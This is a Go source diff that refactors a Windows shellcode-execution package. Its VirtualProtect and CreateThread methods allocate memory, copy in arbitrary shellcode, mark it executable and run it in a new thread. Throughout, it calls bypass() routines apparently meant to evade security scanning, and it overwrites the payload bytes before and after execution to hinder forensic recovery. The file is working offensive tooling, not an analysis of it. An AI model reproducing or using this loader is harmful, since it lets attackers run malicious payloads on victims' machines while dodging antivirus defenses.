@@ -3,13 +3,35 @@
 package shellcode
 
 import (
-	"sync"
-	"syscall"
 	"unsafe"
 
 	"github.com/pkg/errors"
+	"golang.org/x/sys/windows"
 
 	"project/internal/random"
+)
+
+// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
+const (
+	memCommit  = uintptr(0x1000)
+	memReserve = uintptr(0x2000)
+	memRelease = uintptr(0x8000)
+
+	pageReadWrite        = uintptr(0x04)
+	pageExecute          = uintptr(0x10)
+	pageExecuteReadWrite = uintptr(0x40)
+
+	infinite = uintptr(0xFFFFFFFF)
+)
+
+var (
+	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
+
+	procVirtualAlloc        = modKernel32.NewProc("VirtualAlloc")
+	procVirtualProtect      = modKernel32.NewProc("VirtualProtect")
+	procCreateThread        = modKernel32.NewProc("CreateThread")
+	procWaitForSingleObject = modKernel32.NewProc("WaitForSingleObject")
+	procVirtualFree         = modKernel32.NewProc("VirtualFree")
 )
 
 // Execute is used to execute shellcode, default method is VirtualProtect,.
@@ -26,178 +48,53 @@ func Execute(method string, shellcode []byte) error {
 	}
 }
 
-var (
-	initFindProcVirtualProtectOnce sync.Once
-
-	vpVirtualAlloc        *syscall.Proc
-	vpVirtualProtect      *syscall.Proc
-	vpCreateThread        *syscall.Proc
-	vpWaitForSingleObject *syscall.Proc
-	vpVirtualFree         *syscall.Proc
-
-	initVirtualProtectErr error
-)
-
-func initFindProcVirtualProtect() {
-	bypass()
-	var kernel32 *syscall.DLL
-	kernel32, initVirtualProtectErr = syscall.LoadDLL("kernel32.dll")
-	if initVirtualProtectErr != nil {
-		return
-	}
-
-	procMap := [5]*struct {
-		name string
-		proc **syscall.Proc
-	}{
-		{"VirtualAlloc", &vpVirtualAlloc},
-		{"VirtualProtect", &vpVirtualProtect},
-		{"CreateThread", &vpCreateThread},
-		{"WaitForSingleObject", &vpWaitForSingleObject},
-		{"VirtualFree", &vpVirtualFree},
-	}
-	for i := 0; i < 5; i++ {
-		bypass()
-		proc, err := kernel32.FindProc(procMap[i].name)
-		if err != nil {
-			initVirtualProtectErr = err
-			return
-		}
-		bypass()
-		*procMap[i].proc = proc
-	}
-}
-
 // VirtualProtect is used to use virtual protect to execute shellcode,
 // it will block until shellcode exit, so usually  need create a goroutine
 // to execute VirtualProtect.
 func VirtualProtect(shellcode []byte) error {
 	l := len(shellcode)
 	if l == 0 {
-		return errors.New("no data")
+		return errors.New("empty data")
 	}
 
-	initFindProcVirtualProtectOnce.Do(initFindProcVirtualProtect)
-	if initVirtualProtectErr != nil {
-		return errors.WithStack(initVirtualProtectErr)
-	}
-
-	// allocate memory
-	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
-	const (
-		memCommit     = uintptr(0x1000)
-		memReserve    = uintptr(0x2000)
-		pageReadWrite = uintptr(0x04)
-		pageExecute   = uintptr(0x10)
-		memRelease    = uintptr(0x8000)
-		infinite      = uintptr(0xFFFFFFFF)
-	)
+	// allocate memory and copy shellcode
 	bypass()
-	memAddr, _, err := vpVirtualAlloc.Call(0, uintptr(l),
-		memReserve|memCommit, pageReadWrite)
+	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageReadWrite)
 	if memAddr == 0 {
 		return errors.WithStack(err)
 	}
+	copyShellcode(memAddr, shellcode)
 
-	// copy shellcode
-	bypass()
-	rand := random.NewRand()
-	count := 0
-	total := 0
-	for i := 0; i < l; i++ {
-		if total < maxBypassTimes {
-			if count > criticalValue {
-				bypass()
-				count = 0
-				total++
-			} else {
-				count++
-			}
-		}
-		// set shellcode
-		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
-		*b = shellcode[i]
-
-		// clean shellcode
-		shellcode[i] = byte(rand.Int64())
-	}
+	var run uintptr
+	runPtr := uintptr(unsafe.Pointer(&run)) // #nosec
 
 	// set execute
 	bypass()
-	var run uintptr
-	ok, _, err := vpVirtualProtect.Call(memAddr, uintptr(l),
-		pageExecute, uintptr(unsafe.Pointer(&run))) // #nosec
+	ok, _, err := procVirtualProtect.Call(memAddr, uintptr(l), pageExecute, runPtr)
 	if ok == 0 {
 		return errors.WithStack(err)
 	}
-
 	// execute shellcode
 	bypass()
-	threadAddr, _, err := vpCreateThread.Call(0, 0, memAddr, 0, 0, 0)
+	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
 	if threadAddr == 0 {
 		return errors.WithStack(err)
 	}
+	// wait
 	bypass()
-	_, _, _ = vpWaitForSingleObject.Call(threadAddr, infinite)
+	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)
+
 	// set read write
 	bypass()
-	ok, _, err = vpVirtualProtect.Call(memAddr, uintptr(l),
-		pageReadWrite, uintptr(unsafe.Pointer(&run))) // #nosec
+	ok, _, err = procVirtualProtect.Call(memAddr, uintptr(l), pageReadWrite, runPtr)
 	if ok == 0 {
 		return errors.WithStack(err)
 	}
-
 	// cover shellcode and free allocated memory
-	bypass()
-	rand = random.NewRand()
-	for i := 0; i < l; i++ {
-		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
-		*b = byte(rand.Int64())
-	}
-	_, _, _ = vpVirtualFree.Call(memAddr, 0, memRelease)
+	covertAllocatedMemory(memAddr, l)
 
 	bypass()
 	return nil
-}
-
-var (
-	initFindProcThreadOnce sync.Once
-
-	tVirtualAlloc        *syscall.Proc
-	tCreateThread        *syscall.Proc
-	tWaitForSingleObject *syscall.Proc
-	tVirtualFree         *syscall.Proc
-
-	initThreadErr error
-)
-
-func initFindProcThread() {
-	bypass()
-	var kernel32 *syscall.DLL
-	kernel32, initThreadErr = syscall.LoadDLL("kernel32.dll")
-	if initThreadErr != nil {
-		return
-	}
-
-	procMap := [4]*struct {
-		name string
-		proc **syscall.Proc
-	}{
-		{"VirtualAlloc", &tVirtualAlloc},
-		{"CreateThread", &tCreateThread},
-		{"WaitForSingleObject", &tWaitForSingleObject},
-		{"VirtualFree", &tVirtualFree},
-	}
-	for i := 0; i < 4; i++ {
-		bypass()
-		proc, err := kernel32.FindProc(procMap[i].name)
-		if err != nil {
-			initThreadErr = err
-			return
-		}
-		bypass()
-		*procMap[i].proc = proc
-	}
 }
 
 // CreateThread is used to create thread to execute shellcode.
@@ -206,36 +103,40 @@ func initFindProcThread() {
 func CreateThread(shellcode []byte) error {
 	l := len(shellcode)
 	if l == 0 {
-		return errors.New("no data")
+		return errors.New("empty data")
 	}
 
-	initFindProcThreadOnce.Do(initFindProcThread)
-	if initThreadErr != nil {
-		return errors.WithStack(initThreadErr)
-	}
-
-	// allocate memory
-	// https://docs.microsoft.com/zh-cn/windows/win32/memory/memory-protection-constants
-	const (
-		memCommit            = uintptr(0x1000)
-		memReserve           = uintptr(0x2000)
-		pageExecuteReadWrite = uintptr(0x40)
-		memRelease           = uintptr(0x8000)
-		infinite             = uintptr(0xFFFFFFFF)
-	)
+	// allocate memory and copy shellcode
 	bypass()
-	memAddr, _, err := tVirtualAlloc.Call(0, uintptr(l),
-		memReserve|memCommit, pageExecuteReadWrite)
+	memAddr, _, err := procVirtualAlloc.Call(0, uintptr(l), memReserve|memCommit, pageExecuteReadWrite)
 	if memAddr == 0 {
 		return errors.WithStack(err)
 	}
+	copyShellcode(memAddr, shellcode)
 
-	// copy shellcode
+	// execute shellcode
+	bypass()
+	threadAddr, _, err := procCreateThread.Call(0, 0, memAddr, 0, 0, 0)
+	if threadAddr == 0 {
+		return errors.WithStack(err)
+	}
+	// wait
+	bypass()
+	_, _, _ = procWaitForSingleObject.Call(threadAddr, infinite)
+
+	// cover shellcode and free allocated memory
+	covertAllocatedMemory(memAddr, l)
+
+	bypass()
+	return nil
+}
+
+func copyShellcode(memAddr uintptr, shellcode []byte) {
 	bypass()
 	rand := random.NewRand()
 	count := 0
 	total := 0
-	for i := 0; i < l; i++ {
+	for i := 0; i < len(shellcode); i++ {
 		if total < maxBypassTimes {
 			if count > criticalValue {
 				bypass()
@@ -248,29 +149,17 @@ func CreateThread(shellcode []byte) error {
 		// set shellcode
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
 		*b = shellcode[i]
-
-		// clean shellcode
+		// clean shellcode at once
 		shellcode[i] = byte(rand.Int64())
 	}
+}
 
-	// execute shellcode
+func covertAllocatedMemory(memAddr uintptr, l int) {
 	bypass()
-	threadAddr, _, err := tCreateThread.Call(0, 0, memAddr, 0, 0, 0)
-	if threadAddr == 0 {
-		return errors.WithStack(err)
-	}
-	bypass()
-	_, _, _ = tWaitForSingleObject.Call(threadAddr, infinite)
-
-	// cover shellcode and free allocated memory
-	bypass()
-	rand = random.NewRand()
+	rand := random.NewRand()
 	for i := 0; i < l; i++ {
 		b := (*byte)(unsafe.Pointer(memAddr + uintptr(i))) // #nosec
 		*b = byte(rand.Int64())
 	}
-	_, _, _ = tVirtualFree.Call(memAddr, 0, memRelease)
-
-	bypass()
-	return nil
+	_, _, _ = procVirtualFree.Call(memAddr, 0, memRelease)
 }
